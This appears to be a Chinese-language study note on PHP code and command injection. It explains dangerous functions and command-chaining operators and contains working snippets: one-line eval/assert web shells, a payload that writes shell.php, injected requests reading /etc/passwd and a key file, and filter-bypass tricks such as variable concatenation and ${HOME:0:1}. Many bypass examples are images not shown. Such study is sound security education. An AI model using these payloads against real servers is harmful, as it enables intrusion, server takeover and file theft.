# 危害
 攻击者可直接向后台服务器**注入恶意命令**，依托 Web 服务程序权限**执行**系统指令、**读写**服务器文件；还可通过反弹 Shell 获取**服务器控制权**，以此开展**内网渗透**，横向拓展攻击范围。  

# 漏洞原理
**不正确的输入验证**：未对用户的输入进行有效合法的校验，导致攻击者可以通过恶意注入，执行任意代码。

**不安全的代码开发**：程序员在开发的时候，未发现代码存在逻辑缺陷或设计错误，导致攻击者可以通过这些漏洞执行恶意代码或破坏业务逻辑。

**不安全的文件上传**（间接执行命令）：未对上传文件的类型和内容进行校验，导致含有恶意代码命令的文件上传至服务器，进而控制服务器。

# 代码/命令执行区分
| 对比维度 | 代码执行 | 命令执行 |
| --- | --- | --- |
| **利用门槛 & 挖掘方式** | 多依赖白盒 / 代码审计，黑盒难以探测；<br/>常见于源码泄露、二次开发后台、模板漏洞场景 | 黑盒渗透高频，覆盖面广；<br/>存在 ping 检测、域名查询、路由测试、备份压缩、调用系统工具等功能点时，可直接 Fuzz 测试 |
| **Payload 特征** | 随编程语言变化，针对性强PHP 示例：<br/>`phpinfo();@eval($_POST[x]);`<br/> | 依靠命令拼接符构造拼接符：<br/>`; | & && ||`<br/>系统通用指令：<br/>`whoami、id、ipconfig、ls` |


# 远程代码执行漏洞
业务需求需要调用一些**执行命令**的**函数**，用户可控输入的参数**未经有效过滤**，导致攻击者可以注入恶意代码，实现代码执行。

常见的危险函数：**eval();** assert(); preg_replace(); create_function();

## eval
执行字符串中的php代码，需要;结尾，用户输入未过滤的参数后即可当作代码执行。

```php
<?php @eval($_POST['cmd']);?>
// cmd=phpinfo();
// cmd=system('whoami');
```

## assert
执行字符串中的php代码，不需要以;结尾

```php
<?php @assert($_POST['cmd']);?>
// cmd=phpinfo()
// cmd=system('whoami')
```

## preg_replace
<font style="color:black;">preg_replace ( $pattern , $replacement , $subject )</font>

:::info
<font style="color:black;">特殊记忆：preg_replace("流氓","专家","我是一个全球知名的流氓！") --> 我是一个全球知名的专家！</font>

:::

执行一个正则表达式的搜索和替换，搜索subject中匹配pattern的部分，然后用replacement进行替换。使用**/E**修饰符的时候，替换的内容会被当作php的**代码**来**执行**。

```php
<?php preg_replace("/^test/E",$_POST['cmd'],"test123");?>
// cmd=system('id');
// cmd=phpinfo();
// file_put_contents('shell.php',<?php @eval($_POST['cmd']);?>);
```

## array_map
为数组的每个元素应用回调函数

array_map(myfunction,array1,array2,array3,...)

myfunction：回调函数

array :要处理的数组

```php
$func=$_GET['func'];
$cmd=$_POST['cmd'];
$array[0]=$cmd;
$new_array=array_map($func,$array);
echo $new_array;
// --------------------------------------------------
GET /test.php?FUNC=system&cmd=cat/etc/passwd
// array_map('system',['cat/etc/passwd'])
```

## create_function
create_function函数会创建一个匿名函数lambda，内部实现本质就是拼接字符串，然后用EVAL执行他接受的两个字符串参数 create_function(string $args, string $code)

fuction __lambda_func($args){

$code

}

$args 是函数的参数列表

$code直接插入到函数体的位置,code可以是任意的PHP语句

```php
$a=$_GET['a'];
$b=$_GET['b'];
$a('',$b);
// --------------------------------------------------
a=create_fuction&b=}system('cat /tmp/key.txt');/*
fuction __lambda_func(){
    }system('cat /tmp/key.txt');/*
}
```

## call_user_func
第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数

```php
call_user_func("assert",$_POST['cmd'])  

// assert($_POST['cmd'])
```

# 远程命令执行漏洞
| <font style="color:rgb(15, 17, 21);">函数</font> | <font style="color:rgb(15, 17, 21);">返回值</font> | <font style="color:rgb(15, 17, 21);">获取完整输出</font> | <font style="color:rgb(15, 17, 21);">获取返回状态码</font> | <font style="color:rgb(15, 17, 21);">是否自动输出</font> |
| --- | --- | --- | --- | --- |
| `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">exec</font>` | <font style="color:rgb(15, 17, 21);">最后一行（字符串）</font> | <font style="color:rgb(15, 17, 21);">数组（引用）</font> | <font style="color:rgb(15, 17, 21);">支持</font> | <font style="color:rgb(15, 17, 21);">否</font> |
| `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">shell_exec</font>` | <font style="color:rgb(15, 17, 21);">完整输出（字符串）</font> | <font style="color:rgb(15, 17, 21);">直接得到</font> | <font style="color:rgb(15, 17, 21);">不支持</font> | <font style="color:rgb(15, 17, 21);">否</font> |
| `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">system</font>` | <font style="color:rgb(15, 17, 21);">最后一行（字符串）</font> | <font style="color:rgb(15, 17, 21);">直接输出</font> | <font style="color:rgb(15, 17, 21);">支持</font> | <font style="color:rgb(15, 17, 21);">是</font> |


## 命令拼接
### |
直接执行后面的语句

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777423342280-9ead7c1f-e26a-42c2-a799-5d9880641c05.png)

### ||
前面的语句正确，后面不执行；前面语句错误的话，则执行后面的语句

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777423370281-932f9b58-35b1-4837-9991-25fff090cf11.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777423384843-bc830e30-4eca-4e57-81a2-daf8719aba22.png)

### &
前后的语句均可执行，但是前面语句如果执行失败，那么就输出后面的语句

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777423585380-5ed07618-6d2c-421f-be83-24e771a61cf4.png)

### &&
 前后的语句均可执行，但是前面语句如果执行失败，后面的语句也不会去执行

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777423719772-27566f8c-dc45-4349-bb5d-b2e4297cab04.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777423729150-0d85c17a-e1a2-4e3c-9a87-091d1d357f6c.png)

## 命令过滤绕过
### windows绕过
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777426503993-0a233914-1532-4d63-9202-1775c4f1defb.png)

### linux绕过
#### 命令绕过
##### 正常命令
cat more less head tail sort diff被过滤

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777427696445-ff18cbc4-f06b-4857-9282-bc176570cdc7.png)

##### strings
主要是用于二进制文件中提取可打印字符串的工具，可以提取、显示文件中可打印字符串，经常用于分析二进制文件、调式、逆向

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777427775563-bb335a29-7c6c-4d7a-a69a-087ee37c5a95.png)

##### bash
主要需要去执行命令，但是如果找不到后面要执行的命令，也会将我们的文件信息输出出来

v = verbose：读一行、打印一行，先把脚本**原文输出**，再执行

会把注释、空行也原样打出来

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777427817054-46d1911c-0f17-4fd3-bbcc-87a18adc3542.png)

##### curl
主要是发起网络请求，请求资源去下载，但是除了支持 http 协议，还支持 file 协议

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777428001572-b5dcd291-6d97-4be7-bce1-b17dfe36c77f.png)

##### sed
通过正则表达式对文件实现快速增删改查，过滤和取行

-n：只打印指定行

-p：指定行打印

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777428195477-fea13357-461a-4fbc-83ac-891ac2171756.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777428268751-42be60c9-65fb-484f-8c3c-7b7b65cecc87.png)

##### awk
主要是对文本进行复杂处理

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777428548616-f141f143-bd7f-431e-9065-90ded9a8a103.png)

##### 赋值
a="c"&&b="at"&&$a$b key.flag

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777428783559-d4896b65-f478-4c5b-bf3e-68c21fef8f33.png)

##### echo
将cat转换成base64编码格式使用

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777429193655-f6c378b4-238e-4d9f-bc42-e5998d84cc84.png)

#### 特殊绕过
##### cat绕过
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777429358601-a477db68-1b70-46d0-979d-557c9b80da8b.png)

##### 空格绕过
<> 单独的>不可以绕过

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777429426946-a4d2328d-e30a-4829-8805-cf5718298681.png)

##### 文件名绕过
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777429675499-3d44023a-e3a4-466c-b3f4-90d548233976.png)

##### /路径绕过
${HOME:0:1} -> /

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777429839152-e465b8f0-17ec-4bf7-a6c4-16e76ef5ce66.png)

$(echo . |tr '!-0' '"-1') -> /

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/60942548/1777429935483-39cd0b37-cb8a-41ac-84c2-b676a475a061.png)

